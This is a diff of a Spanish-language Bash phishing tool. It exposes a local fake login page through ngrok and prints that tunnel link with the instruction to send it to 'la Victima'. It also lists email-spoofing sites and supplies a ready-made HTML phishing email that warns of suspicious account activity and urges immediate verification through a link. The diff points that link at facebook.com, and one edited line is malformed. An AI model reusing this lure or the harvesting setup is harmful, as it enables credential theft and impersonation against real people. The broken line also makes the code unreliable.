@@ -369,14 +369,14 @@ printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] o puedes usar Tinyurl:\e[0m\e[1;
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en los siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] https://unavezmasemail.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
+printf "\e[1;92m[\e[0m*\e[1;92m]  \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[0m\e[1;93m Tambien puedes enviar Email con este codigo\e[0m\e[1;77m\n"
 printf "\e[1;92m  <h1>Inicio de Session Indebido</h1> \e[0m\n"
 printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e[0m\n"
 printf "\e[1;92m  <h3>solicitamos que verifiques inmeditamente</h3> \e[0m\n"
 printf "\e[1;92m  <h3>podria tratarse que alguien ingreso a tu cuenta sin previo aviso</h3> \e[0m\n" 
 printf "\e[1;92m  <h3>verifica en el siguiente enlace..</h3> \e[0m\n"
-printf "\e[1;92m  <a href='aqui tu enlace'>Aqui</a> \e[0m\n"
+printf "\e[1;92m  <a href='http://facebook.com'>Aqui</a> \e[0m\n"
 checkfound
 
 
@@ -456,7 +456,7 @@ printf "\e[1;92m[\e[0m*\e[1;92m] Comienza el servidor con Ngrok...\n"
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Envia este link a la Victima:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Envia este link a la Victima:\e[0m\e[1;77m %s\e[0m\n" $://unavezmasemail.000webhostapp.com/ 
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en os siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://pruebaemailspoof.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
@@ -467,7 +467,7 @@ printf "\e[1;92m  <h3>Hemos notado una actividad sospechoza en tu cuenta</h3> \e
 printf "\e[1;92m  <h3>solicitamos que verifiques inmeditamente</h3> \e[0m\n"
 printf "\e[1;92m  <h3>podria tratarse que alguien ingreso a tu cuenta sin previo aviso</h3> \e[0m\n" 
 printf "\e[1;92m  <h3>verifica en el siguiente enlace..</h3> \e[0m\n"
-printf "\e[1;92m  <a href='aqui tu enlace'>Aqui</a> \e[0m\n"
+printf "\e[1;92m  <a href='http://facebook.com'>Aqui</a> \e[0m\n"
 checkfound
 }
 
